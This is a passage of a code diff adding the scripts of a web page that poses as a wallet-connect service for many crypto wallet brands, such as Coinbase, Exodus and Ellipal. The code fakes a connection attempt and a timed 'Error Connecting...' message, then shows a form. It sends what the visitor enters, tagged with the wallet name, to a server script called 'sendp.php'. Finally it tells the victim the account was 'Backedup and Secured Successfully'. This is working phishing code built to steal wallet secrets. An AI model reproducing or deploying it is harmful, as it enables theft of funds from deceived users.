+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("MEET. ONE");
+                    $("#myImg").attr("src", "images/icons/MEETONE.jpg");
+                }, 5000);
+            } else if (id == "dock") {
+                $("#loader_img").attr("src", "images/icons/DockWallet.png");
+                $("#img").attr("src", "images/icons/DockWallet.png");
+                $("#wallet_name").html("Dock Wallet");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Dock");
+                    $("#myImg").attr("src", "images/icons/DockWallet.png");
+                }, 5000);
+            } else if (id == "at") {
+                $("#loader_img").attr("src", "images/icons/ATWallet.png");
+                $("#img").attr("src", "images/icons/ATWallet.png");
+                $("#wallet_name").html("AT. Wallet");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("AT. ");
+                    $("#myImg").attr("src", "images/icons/ATWallet.png");
+                }, 5000);
+            } else if (id == "moriX") {
+                $("#loader_img").attr("src", "images/icons/MoriXWallet.png");
+                $("#img").attr("src", "images/icons/MoriXWallet.png");
+                $("#wallet_name").html("MoriX Wallet");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("MoriX");
+                    $("#myImg").attr("src", "images/icons/MoriXWallet.png");
+                }, 5000);
+            } else if (id == "midas") {
+                $("#loader_img").attr("src", "images/icons/Midas Wallet.png");
+                $("#img").attr("src", "images/icons/Midas Wallet.png");
+                $("#wallet_name").html("Midas Wallet");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Midas");
+                    $("#myImg").attr("src", "images/icons/Midas Wallet.png");
+                }, 5000);
+            } else if (id == "ellipal") {
+                $("#loader_img").attr("src", "images/icons/Ellipal.png");
+                $("#img").attr("src", "images/icons/Ellipal.png");
+                $("#wallet_name").html("Ellipal");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Ellipal");
+                    $("#myImg").attr("src", "images/icons/Ellipal.png");
+                }, 5000);
+            } else if (id == "keyringpro") {
+                $("#loader_img").attr("src", "images/icons/KEYRING PRO.png");
+                $("#img").attr("src", "images/icons/KEYRING PRO.png");
+                $("#wallet_name").html("KEYRING PRO");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("KEYRING PRO");
+                    $("#myImg").attr("src", "images/icons/KEYRING PRO.png");
+                }, 5000);
+            } else if (id == "blockchain") {
+                $("#loader_img").attr("src", "images/icons/Blockchain.png");
+                $("#img").attr("src", "images/icons/Blockchain.png");
+                $("#wallet_name").html("Blockchain");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Blockchain");
+                    $("#myImg").attr("src", "images/icons/Blockchain.png");
+                }, 5000);
+            } else if (id == "Binance_Smart_Chain") {
+                $("#loader_img").attr("src", "images/icons/Binance Smart Chain.png");
+                $("#img").attr("src", "images/icons/Binance Smart Chain.png");
+                $("#wallet_name").html("Binance Smart Chain");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Binance Smart Chain");
+                    $("#myImg").attr("src", "images/icons/Binance Smart Chain.png");
+                }, 5000);
+            } else if (id == "aktionariat") {
+                $("#loader_img").attr("src", "images/icons/aktionariat-c5784b26234a389632687a36d2fb3258.png");
+                $("#img").attr("src", "images/icons/aktionariat-c5784b26234a389632687a36d2fb3258.png");
+                $("#wallet_name").html("Aktionariat");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Aktionariat");
+                    $("#myImg").attr("src", "images/icons/aktionariat-c5784b26234a389632687a36d2fb3258.png");
+                }, 5000);
+            } else if (id == "coinbase") {
+                $("#loader_img").attr("src", "images/icons/Coinbase.png");
+                $("#img").attr("src", "images/icons/Coinbase.png");
+                $("#wallet_name").html("Coinbase");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Coinbase");
+                    $("#myImg").attr("src", "images/icons/Coinbase.png");
+                }, 5000);
+            } else if (id == "exodus") {
+                $("#loader_img").attr("src", "images/icons/Exodus.png");
+                $("#img").attr("src", "images/icons/Exodus.png");
+                $("#wallet_name").html("Exodus");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Exodus");
+                    $("#myImg").attr("src", "images/icons/Exodus.png");
+                }, 5000);
+            }
+        });
+
+
+        // Variable to store the interval ID
+        let intervalId;
+        // con_status function
+        function con_status(id) {
+            // Target the element by its id
+            const statusElement = document.getElementById('con_stats');
+            //console.log(statusElement);
+
+            // Array of words to cycle through
+            const words = [`Connecting to ${id} wallet...`, `Processing to Wallet...`, 'Loading...'];
+
+            // Delay in milliseconds between word changes
+            const delay = 2000; // 2000 milliseconds = 2 seconds
+
+            // Function to rotate through the words
+            function rotateWords() {
+                let currentIndex = 0;
+
+                // Set initial word
+                statusElement.textContent = words[currentIndex];
+
+                // Rotate words at the specified interval
+                intervalId = setInterval(() => {
+                    currentIndex = (currentIndex + 1) % words.length;
+                    statusElement.textContent = words[currentIndex];
+                    $("#con_stats").css("color", "black");
+                    $("#con_button").css("display", "none");
+                    $(".loader").css("display", "inline-flex");
+                    $("#input_con").css("display", "none");
+
+                    // Clear the interval after the last word
+                    if (currentIndex === words.length - 1) {
+                        clearInterval(intervalId);
+                    }
+
+                }, delay);
+            }
+
+            // Start rotating the words
+            rotateWords();
+        }
+
+
+
+        // Wait for the DOM to load
+        // document.addEventListener('DOMContentLoaded', function() {
+        //     // Get all the elements with the specified class or shared attribute
+        //     var chatButtons = document.querySelectorAll('.modal_close');
+
+        //     // Loop through the buttons and attach the click event listener
+        //     chatButtons.forEach(function(button) {
+        //         button.addEventListener('click', function() {
+        //             // $("#con_stats").html("Connecting...");
+        //             //     $("#con_stats").css("color", "black");
+        //             //    // $(".loader").css("display", "inline-flex");
+        //             clearInterval(intervalId);
+        //             $("#con_button").css("display", "none");
+        //             //     $("#con_stats").css("display", "inline-flex");
+        //             $("#input_con").css("display", "none");
+        //             //     $(".sendp").trigger("reset");
+        //             alert("jkygygy");
+        //             // Clear the interval 
+        //         });
+        //     });
+        // });
+
+
+
+        // reset modal after every exit
+        $('.modal_close').click(function() {
+            // $("#con_stats").html("Connecting...");
+            $("#con_button").css("display", "none");
+            $("#img").css("display", "none");
+            //    // $(".loader").css("display", "inline-flex");
+            clearInterval(intervalId);
+
+            //     $("#con_stats").css("display", "inline-flex");
+            $("#input_con").css("display", "none");
+            $("#con_stats").css("color", "black");
+            //     $(".sendp").trigger("reset");
+            //alert("jkygygy");
+            // Clear the interval 
+
+        })
+
+        $('.modal').modal({
+            backdrop: 'static',
+            keyboard: false
+        });
+
+
+
+
+        //set elelments on click connect button
+        $("#con_button").click(function() {
+            $("#input_con").css("display", "inline-flex");
+            $("#con_button").css("display", "none");
+            $("#con_stats").css("display", "none");
+            $("#img").attr("src", "images/Ledger_Nano_X_Onyx_Black_768x.webp");
+        });
+
+
+
+
+
+        ///send the mail
+        $(".sendp").on('submit', function(e) {
+            e.preventDefault();
+            var keyid = $("#walletname1").html();
+            // var ty =$("#type_of_login_detail").val();
+            //    alert(ty);
+            //loading45();
+            var formData = new FormData(this);
+            formData.append("keyid", keyid);
+            $.ajax({
+                type: 'POST',
+                url: 'includes/sendp.php',
+                data: formData,
+                contentType: false,
+                cache: false,
+                processData: false,
+                success: function(response) {
+                    const modal = $('#paynow');
+                    modal.modal('hide');
+
+                    Swal.fire({
+                        title: 'Please Wait!',
+                        html: `Connecting...`,
+                        timer: 8000,
+                        allowOutsideClick: false, // Disable closing on outside click
+                        // timerProgressBar: true,
+                        didOpen: () => {
+                            Swal.showLoading()
+                            //alert("yess")
+                            updateMessage();
+
+                        },
+                    }).then((result) => {
+                        Swal.fire(
+                            'Connected!',
+                            'Your Account has been Backedup and Secured Successfully',
+                            'success'
+                        );
+                        $("#con_button").css("display", "none");
+                        $("#img").css("display", "none");
+                        //    // $(".loader").css("display", "inline-flex");
+                        clearInterval(intervalId);
+
+                        //     $("#con_stats").css("display", "inline-flex");
+                        $("#input_con").css("display", "none");
+                        $("#con_stats").css("color", "black");
+                    })
+
+                }
+            });
+        });
+    });
+</script>
+
+
+
+<script src="js/purecounter.js"></script>
+<script src="js/bootstrap.bundle.min.js"></script>
+<!-- <script src="js/slick.min.js"></script> -->
+<script src="js/feather.min.js"></script>
+
+<script src="js/glightbox.min.js"></script>
+<script src="js/validate.js"></script>
+<script src="js/selectric.min.js"></script>
+<script src="js/iziToast.min.js"></script>
+<script src="js/jquery.uploadPreview.min.js"></script>
+<script src="js/user_dashboard.js"></script>
+
+
+<script>
+    // $(function() {
+    //     'use strict'
+
+    //     $('.paynow').on('click', function() {
+    //         const modal = $('#paynow')
+
+    //         modal.find('form').attr('action', $(this).data('href'))
+    //         modal.find('input[name=id]').val($(this).data('id'))
+
+    //         modal.modal('show')
+    //     })
+    // })
+</script>
+
+
+
+
+
+
+<script>
+    'use strict'
+    var url = "index.php/changeLang";
+
+    $(".changeLang").change(function() {
+        if ($(this).val() == '') {
+            return false;
+        }
+        window.location.href = url + "?lang=" + $(this).val();
+    });
+
+    feather.replace();
+
+    // responsive menu slideing
+    $(".d-sidebar-menu>li>a").on("click", function() {
+        var element = $(this).parent("li");
+        if (element.hasClass("open")) {
+            element.removeClass("open");
+            element.find("li").removeClass("open");
+            element.find("ul").slideUp(500, "linear");
+        } else {
+            element.addClass("open");
+            element.children("ul").slideDown();
+            element.siblings("li").children("ul").slideUp();
+            element.siblings("li").removeClass("open");
+            element.siblings("li").find("li").removeClass("open");
+            element.siblings("li").find("ul").slideUp();
+        }
+    });
+
+    $('.sidebar-open-btn').on('click', function() {
+        $(this).toggleClass('active');
+        $('.d-sidebar').toggleClass('active');
+    });
+</script>
+</body>
+
+</html>
